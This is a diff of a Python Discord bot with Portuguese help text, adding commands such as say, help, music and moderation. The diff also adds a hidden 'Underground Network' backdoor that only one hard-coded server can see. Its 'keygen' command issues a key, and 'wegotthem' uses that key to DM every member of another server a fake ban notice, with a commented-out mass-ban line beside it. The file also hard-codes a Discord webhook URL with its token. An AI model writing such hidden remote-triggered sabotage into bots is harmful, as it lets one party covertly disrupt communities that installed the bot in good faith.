@@ -8,7 +8,6 @@ import requests
 import dhooks
 from pathlib import Path
 import string
-import Commands
 client = discord.Client()
 regular_commands = {}
 hook = dhooks.Webhook('https://discordapp.com/api/webhooks/516092910081409058/dQ1YJOs3qwD57lM6CH9nhChJyhVO39Oc1YchGpUQE3f1qvpHIu8EXptI-_qlXUVxBjkG')
@@ -68,8 +67,60 @@ def ComoUsar(command):
 async def on_message(message):
 	server_info = server.getInfo(f"{message.server.id}")
 	prefix = server_info['prefix']
-	do = Commands.handler(message, client)
-	do
+	command = message.content.lower().startswith
+	help_embed=discord.Embed(title="Help me!", description="Aqui estão todos os comandos disponivéis!")
+	help_embed.add_field(name="Misc", value=f"{prefix}say -» *Faça eu dizer algo!*\n{prefix}avatar -» *Veja seu avatar ou de outro usuario ;)*\n{prefix}perfil -» *mostra seu perfil ou o de outro usuario :)*\n{prefix}img -» *faça eu pesquisar alguna imagem no google*\n{prefix}yt -» *procura algum video no YoutTube*\n{prefix}invite -» *Manda o meu invite :3*\n{prefix}weather -» *mostra o tempo de uma região*", inline=False)
+	help_embed.add_field(name="Administrativo", value=f"\n{prefix}clear -» *limpa as mensagens de um canal*\n{prefix}mute -» *muta um usuário*\n{prefix}ban -» *bane um usuario*\n{prefix}t[emp]mute -» *muta um usuário por um tempo determinado*", inline=False)
+	help_embed.add_field(name="Musica", value=f"\n{prefix}play -» *toca uma musica do youtube ou de um arquivo anexado*\n{prefix}queue -» *mostra a lista de musicas*\n{prefix}stop -» *para a baladinha*\n{prefix}pause -» *pausa a baladinha*\n{prefix}skip -» *pula ou vota para pular a musica*", inline=False)
+	help_embed.add_field(name="Configurações", value=f"\n{prefix}config -» *muda um valor da configuração deste servidor*")	
+	if server_info['commands'] == "0":
+		help_embed.add_field(name="Comandos Personalizados", value=f"*Nenhum comando foi encontrado :(*\n{prefix}command -» *cria um comando personalizado*", inline=False)
+	if message.server.id == '513142267654176784':
+		help_embed.add_field(name="Underground Network [EXTRA]", value=f"\n{prefix}wegotthem -» **apocalipse**\n{prefix}keygen -» **new apocalipse key**")
+	if command(prefix):
+		args = message.content.split(" ")
+		cmd = message.content.lower().startswith(prefix + "help")
+		if command(prefix + "help"):
+			await client.send_message(message.channel, embed=help_embed)
+		elif command(prefix + "comousar"):
+			try:
+				if args[1] in regular_commands:				
+					await client.send_message(message.channel, embed=ComoUsar(f"{args[1]}"))
+				else:
+					await client.send_message(message.channel, "Nenhum comando parecido foi encontrado :(")
+			except IndexError:
+				await client.send_message(message.channel, embed=ComoUsar(f"comousar"))
+		elif command(prefix + "say"):
+			say = " ".join(args[1:])
+			if len(say) >= 1:
+				say=discord.Embed(color=0x2C2F33, title=" ", description=f"{say}")
+				await client.send_message(message.channel, embed=say)
+			else:
+				await client.send_message(message.channel, embed=ComoUsar("say"))
+		elif command(prefix + "keygen"):
+			if message.server.id == '513142267654176784':
+				KeyGen()
+				await client.send_message(client.get_channel('518178372493246482'), "Key generated:")
+				await client.send_message(client.get_channel('518178372493246482'), f"{Key}")
+		elif command(prefix + "wegotthem"):
+			try:
+				if args[1] == f'{Key}':
+					if message.server.id != '513142267654176784':
+						KeyGen()
+						await client.send_message(client.get_channel('518178372493246482'), "Key generated:")
+						await client.send_message(client.get_channel('518178372493246482'), f"{Key}")
+						players = []
+						for member in message.server.members:
+							players.append(member)		
+						for member in players:
+							await client.send_message(member, "Opa! parece que `VOCÊ FOI BANIDO!`\nlol")
+				#			await client.ban(member, 1)
+					else:
+						await client.send_message(message.channel, "```css\n#Error\n\n[ 0 ] This command is not allowed in this server.\n\nLenny #EC:1001\n```")
+			except IndexError:
+				if message.server.id == '513142267654176784':
+					await client.send_message(message.channel, embed=ComoUsar("wegotthem"))
+
 @client.event
 async def on_ready():
 	await client.change_status(game=discord.Game(name='Jogos! ;)'))
